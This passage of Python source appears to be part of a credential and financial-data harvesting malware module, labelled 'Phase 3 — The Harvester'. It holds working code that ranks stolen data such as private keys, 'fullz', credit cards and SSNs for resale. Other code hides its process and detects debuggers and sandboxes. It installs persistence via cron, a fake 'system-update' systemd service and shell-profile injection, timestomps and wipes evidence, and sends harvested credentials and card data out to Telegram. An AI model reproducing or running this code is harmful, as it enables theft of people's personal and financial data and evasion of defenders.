                for fmt in ["%m/%d/%Y", "%m-%d-%Y", "%Y-%m-%d", "%d/%m/%Y"]:
                    try:
                        birth_date = datetime.datetime.strptime(dob, fmt)
                        age = (datetime.datetime.now() - birth_date).days / 365.25
                        if 18 <= age <= 100:
                            score += 1.0
                        checks += 1
                        break
                    except:
                        continue
            except:
                pass

        return score / checks if checks > 0 else 0.0

    def threat_rank(self, data: Dict) -> int:
        """Rank threat level of data (1-10)."""
        score = 0
        data_type = data.get("type", "")
        item_data = data.get("data", {})
        confidence = data.get("confidence", 0.0)

        # Base score by data type
        type_scores = {
            "private_keys": 10,
            "fullz": 9,
            "crypto_wallets": 8,
            "credit_cards": 7,
            "ssns": 7,
            "api_keys": 6,
            "oauth_tokens": 6,
            "credentials": 5,
            "session_tokens": 4,
            "phone_numbers": 3,
            "telegram_bots": 3,
            "discord_webhooks": 2,
            "db_connections": 5,
            "ssh_keys": 4,
        }
        score += type_scores.get(data_type, 1)

        # Confidence boost
        score += int(confidence * 3)

        # High-value indicators
        if data_type == "credentials":
            email = item_data.get("email", "")
            if "@gmail.com" in email or "@yahoo.com" in email:
                score += 1
            if "admin" in email or "root" in email:
                score += 2

        elif data_type == "api_keys":
            service = item_data.get("service", "")
            if service in ("aws", "stripe", "github"):
                score += 2

        return min(score, 10)

    def get_pricing_report(self) -> Dict[str, Any]:
        """Generate current pricing report."""
        report = {}
        for data_type, base_price in self._pricing_model.items():
            report[data_type] = {
                "base_price": base_price,
                "current_range": f"${base_price * 0.5:.2f} - ${base_price * 2.0:.2f}",
            }
        return report


# ============================================================================
# SECTION 16: STEALTH CORE — Process hiding, anti-debug, secure delete
# ============================================================================

class StealthCore:
    """Military-grade stealth operations. Hide, evade, persist, destroy."""

    __slots__ = ("_lock", "_hidden", "_debugger_detected", "_persistence_installed")

    # Known debugger/analysis processes
    DEBUG_PROCS = [
        "gdb", "lldb", "strace", "ltrace", "ptrace",
        "x64dbg", "x32dbg", "ollydbg", "windbg",
        "ida64", "ida", "immunitydebugger",
        "radare2", "cutter", "ghidra", "frida-server",
    ]

    # Sandbox indicators
    SANDBOX_FILES = [
        "/sys/class/dmi/id/product_name",
        "/sys/class/dmi/id/sys_vendor",
        "/proc/scsi/scsi",
    ]

    def __init__(self):
        self._lock = threading.RLock()
        self._hidden = False
        self._debugger_detected = False
        self._persistence_installed = False

    def hide_process(self, name: str = None):
        """Hide process by renaming."""
        if name is None:
            name = OanksConfig.PROCESS_HIDE_NAME

        with self._lock:
            try:
                # Try prctl
                libc = ctypes.CDLL("libc.so.6")
                argv0 = (ctypes.c_char * 256)(*name.encode())
                libc.prctl(15, ctypes.byref(argv0), 0, 0, 0)
                self._hidden = True
            except:
                pass

            try:
                # Fallback: modify /proc/self/comm
                with open("/proc/self/comm", "w") as f:
                    f.write(name.strip("[]"))
                self._hidden = True
            except:
                pass

    def anti_debug(self) -> bool:
        """Check for debuggers and analysis tools."""
        with self._lock:
            # Check TracerPid
            try:
                with open("/proc/self/status", "r") as f:
                    for line in f:
                        if line.startswith("TracerPid:"):
                            tracer = int(line.split()[1])
                            if tracer != 0:
                                self._debugger_detected = True
                                return True
            except:
                pass

            # Check for debugger processes
            try:
                for pid in os.listdir("/proc"):
                    if pid.isdigit():
                        try:
                            with open(f"/proc/{pid}/comm", "r") as f:
                                comm = f.read().strip().lower()
                                if comm in self.DEBUG_PROCS:
                                    self._debugger_detected = True
                                    return True
                        except:
                            pass
            except:
                pass

            # Check for sandbox indicators
            for sandbox_file in self.SANDBOX_FILES:
                if os.path.exists(sandbox_file):
                    try:
                        with open(sandbox_file, "r") as f:
                            content = f.read().lower()
                            for keyword in ["vmware", "virtualbox", "kvm", "qemu", "xen"]:
                                if keyword in content:
                                    self._debugger_detected = True
                                    return True
                    except:
                        pass

            # Timing attack
            t1 = time.perf_counter()
            for _ in range(1000000):
                pass
            t2 = time.perf_counter()
            if (t2 - t1) > 0.5:
                self._debugger_detected = True
                return True

            return False

    def secure_delete(self, filepath: str, passes: int = 3):
        """Securely delete file with multiple overwrite passes."""
        try:
            if not os.path.exists(filepath):
                return

            size = os.path.getsize(filepath)

            with open(filepath, "r+b") as f:
                for _ in range(passes):
                    f.seek(0)
                    f.write(os.urandom(size))
                    f.flush()
                    os.fsync(f.fileno())

                f.seek(0)
                f.write(b"\x00" * size)
                f.flush()
                os.fsync(f.fileno())

            os.remove(filepath)
        except:
            pass

    def setup_persistence(self):
        """Install persistence via cron and systemd user service."""
        with self._lock:
            if self._persistence_installed:
                return

            script_path = os.path.abspath(sys.argv[0]) if sys.argv else ""
            if not script_path:
                return

            # Method 1: Cron job
            try:
                cron_entry = f"*/5 * * * * python3 {script_path} >> /dev/null 2>&1\n"
                result = subprocess.run(
                    ["crontab", "-l"],
                    capture_output=True, text=True, timeout=5
                )
                current = result.stdout if result.returncode == 0 else ""

                if script_path not in current:
                    new_crontab = current + cron_entry
                    proc = subprocess.Popen(
                        ["crontab", "-"],
                        stdin=subprocess.PIPE, text=True
                    )
                    proc.communicate(input=new_crontab, timeout=5)
            except:
                pass

            # Method 2: Systemd user service
            try:
                service_name = "system-update.service"
                service_dir = os.path.expanduser("~/.config/systemd/user")
                os.makedirs(service_dir, exist_ok=True)

                service_content = f"""[Unit]
Description=System Update Service
After=network.target

[Service]
Type=simple
ExecStart=/usr/bin/python3 {script_path}
Restart=always
RestartSec=60

[Install]
WantedBy=default.target
"""
                service_path = os.path.join(service_dir, service_name)
                with open(service_path, "w") as f:
                    f.write(service_content)

                subprocess.run(
                    ["systemctl", "--user", "daemon-reload"],
                    capture_output=True, timeout=10
                )
                subprocess.run(
                    ["systemctl", "--user", "enable", service_name],
                    capture_output=True, timeout=10
                )
            except:
                pass

            # Method 3: Shell profile injection
            try:
                profiles = [
                    os.path.expanduser("~/.bashrc"),
                    os.path.expanduser("~/.zshrc"),
                    os.path.expanduser("~/.profile"),
                ]

                marker = "# System update check"
                cmd = f"python3 {script_path} &>/dev/null &"

                for profile in profiles:
                    if os.path.exists(profile):
                        with open(profile, "r") as f:
                            content = f.read()

                        if marker not in content:
                            with open(profile, "a") as f:
                                f.write(f"\n{marker}\n")
                                f.write(f"(sleep 30 && {cmd})\n")
            except:
                pass

            self._persistence_installed = True

    def evade_forensics(self):
        """Run full anti-forensic operations."""
        # Timestomp common files
        try:
            for root, dirs, files in os.walk(os.path.expanduser("~/.cache")):
                for f in files:
                    try:
                        fpath = os.path.join(root, f)
                        # Set random past timestamps
                        past = time.time() - random.randint(86400 * 30, 86400 * 365)
                        os.utime(fpath, (past, past))
                    except:
                        pass
        except:
            pass

    def is_compromised(self) -> bool:
        """Check if running in compromised/analysis environment."""
        return self.anti_debug()


# ============================================================================
# SECTION 17: HARVESTER CORE — Main orchestrator
# ============================================================================

class HarvesterCore:
    """Military-grade harvester orchestrator. The brain of Phase 3."""

    __slots__ = ("_config", "_crypto", "_db", "_proxy_bridge", "_requester",
                 "_validator", "_extractor", "_scraper", "_manager",
                 "_telegram", "_intelligence", "_stealth", "_lock",
                 "_running", "_harvest_thread", "_stats_thread",
                 "_telegram_token", "_telegram_chat", "_master_key")

    def __init__(self, proxy_core=None, db_manager=None, crypto=None, telegram=None):
        self._proxy_bridge = None
        self._telegram_token = None
        self._telegram_chat = None
        self._master_key = None
        self._lock = threading.RLock()
        self._running = False
        self._harvest_thread = None
        self._stats_thread = None

    def initialize(self, proxy_list: List[str] = None, telegram_token: str = None,
                   telegram_chat: str = None, master_key: str = None):
        """Initialize all Phase 3 subsystems."""
        with self._lock:
            self._master_key = master_key or hashlib.sha256(os.urandom(32)).hexdigest()
            self._telegram_token = telegram_token
            self._telegram_chat = telegram_chat

            # Initialize crypto
            self._crypto = OanksCrypto(self._master_key)

            # Initialize database
            self._db = OanksDB(OanksConfig.DB_PATH, self._crypto)

            # Initialize proxy bridge
            self._proxy_bridge = ProxyHellBridge(proxy_list)
            if proxy_list:
                self._proxy_bridge.start_health_monitor()

            # Initialize requester
            self._requester = StealthRequester(self._proxy_bridge)

            # Initialize validator
            self._validator = DataValidator()

            # Initialize extractor
            self._extractor = DataExtractor(self._validator)

            # Initialize scraper
            self._scraper = SourceScraper(self._requester, self._extractor)

            # Initialize manager
            self._manager = HarvestManager(self._db, self._crypto, self._validator)
            self._manager.start_processing()

            # Initialize Telegram feed
            if telegram_token and telegram_chat:
                self._telegram = TelegramFeed(telegram_token, telegram_chat)
            else:
                self._telegram = None

            # Initialize intelligence
            self._intelligence = IntelligenceEngine(self._db)

            # Initialize stealth
            self._stealth = StealthCore()
            self._stealth.hide_process()
            self._stealth.setup_persistence()

            return True

    def scrape_all(self) -> Dict[str, List[Dict]]:
        """Scrape all sources."""
        return self._scraper.scrape_all()

    def extract_data(self, text: str, source: str) -> Dict[str, List]:
        """Extract data from text."""
        return self._extractor.extract_all(text, source)

    def store_data(self, data: Dict) -> int:
        """Store data in database."""
        count = 0
        for data_type, items in data.items():
            for item in items:
                self._manager.add_to_queue(item)
                count += 1
        return count

    def _harvest_cycle(self):
        """Single harvest cycle."""
        try:
            # Check for debuggers
            if self._stealth.is_compromised():
                self._stealth.evade_forensics()

            # Scrape all sources
            results = self.scrape_all()

            # Store results
            stored = self.store_data(results)

            # Process queue
            processed = self._manager.process_queue()

            # Check for high-value items
            if self._telegram:
                for data_type, items in results.items():
                    for item in items:
                        if item.get("confidence", 0) >= OanksConfig.HIGH_VALUE_THRESHOLD:
                            self._telegram.alert_high_value(item)

            return stored, processed

        except Exception:
            return 0, 0

    def _harvest_loop(self):
        """Main harvest loop."""
        while self._running:
            try:
                self._harvest_cycle()

                # Telegram stats and exports
                if self._telegram:
                    db_stats = self._db.get_stats()
                    self._telegram.check_and_send_stats(db_stats)
                    self._telegram.check_and_send_export(self._db, "credentials")
                    self._telegram.check_and_send_export(self._db, "credit_cards")

                time.sleep(OanksConfig.SCRAPE_INTERVAL)
            except:
                time.sleep(OanksConfig.SCRAPE_INTERVAL)

    def _stats_loop(self):
        """Background stats loop."""
        while self._running:
            try:
                if self._telegram:
                    db_stats = self._db.get_stats()
                    self._telegram.send_stats(db_stats)
                time.sleep(OanksConfig.TELEGRAM_STATS_INTERVAL)
            except:
                time.sleep(OanksConfig.TELEGRAM_STATS_INTERVAL)

    def start(self, interval: int = None):
        """Start harvesting."""
        with self._lock:
            if self._running:
                return

            self._running = True

            # Start harvest thread
            self._harvest_thread = threading.Thread(target=self._harvest_loop, daemon=True)
            self._harvest_thread.start()

            # Start stats thread
            if self._telegram:
                self._stats_thread = threading.Thread(target=self._stats_loop, daemon=True)
                self._stats_thread.start()

    def stop(self):
        """Stop harvesting."""
        with self._lock:
            self._running = False

            if self._harvest_thread:
                self._harvest_thread.join(timeout=10)
            if self._stats_thread:
                self._stats_thread.join(timeout=10)

            self._manager.stop_processing()

            if self._proxy_bridge:
                self._proxy_bridge.stop_health_monitor()

    def get_status(self) -> Dict[str, Any]:
        """Get harvester status."""
        with self._lock:
            status = {
                "running": self._running,
                "oanks_identity": OANKS_IDENTITY,
                "oanks_version": OANKS_VERSION,
                "oanks_signature": OANKS_SIGNATURE,
                "db_stats": self._db.get_stats() if self._db else {},
                "manager_stats": self._manager.get_stats() if self._manager else {},
                "requester_stats": self._requester.get_stats() if self._requester else {},
                "proxy_stats": self._proxy_bridge.get_stats() if self._proxy_bridge else {},
                "telegram_stats": self._telegram.get_stats() if self._telegram else {},
                "stealth_hidden": self._stealth._hidden if self._stealth else False,
                "stealth_debugger": self._stealth._debugger_detected if self._stealth else False,
                "timestamp": datetime.datetime.utcnow().isoformat(),
            }
            return status

    def emergency_wipe(self):
        """Emergency wipe all data."""
        with self._lock:
            self.stop()

            if self._db:
                self._db.secure_wipe()

            # Wipe log file
            if os.path.exists(OanksConfig.LOG_PATH):
                self._stealth.secure_delete(OanksConfig.LOG_PATH)

            # Wipe export directory
            if os.path.exists(OanksConfig.EXPORT_DIR):
                for f in os.listdir(OanksConfig.EXPORT_DIR):
                    fpath = os.path.join(OanksConfig.EXPORT_DIR, f)
                    self._stealth.secure_delete(fpath)

            # Secure wipe crypto keys
            if self._crypto:
                self._crypto.secure_wipe()


# ============================================================================
# SECTION 18: FACTORY FUNCTION
# ============================================================================

def create_harvester(proxy_list=None, telegram_token=None, 
                     telegram_chat=None, master_key=None) -> HarvesterCore:
    """Factory function to create and initialize HarvesterCore."""
    harvester = HarvesterCore()
    harvester.initialize(
        proxy_list=proxy_list,
        telegram_token=telegram_token,
        telegram_chat=telegram_chat,
        master_key=master_key,
    )
    return harvester


# ============================================================================
# SECTION 19: CONVENIENCE FUNCTIONS
# ============================================================================

def quick_harvest(proxy_list=None, telegram_token=None, 
                  telegram_chat=None, master_key=None,
                  duration_seconds=300):
    """Quick harvest for specified duration."""
    harvester = create_harvester(proxy_list, telegram_token, telegram_chat, master_key)
    harvester.start()

    try:
        time.sleep(duration_seconds)
    except KeyboardInterrupt:
        pass

    harvester.stop()
    return harvester.get_status()


# ============================================================================
# END OF PHASE 3 — THE HARVESTER
# ============================================================================
# All definitions complete. No execution. Import only.
# Phase 4-12 will import from this module.
#
# 👑 Oanks — Creator
# ============================================================================
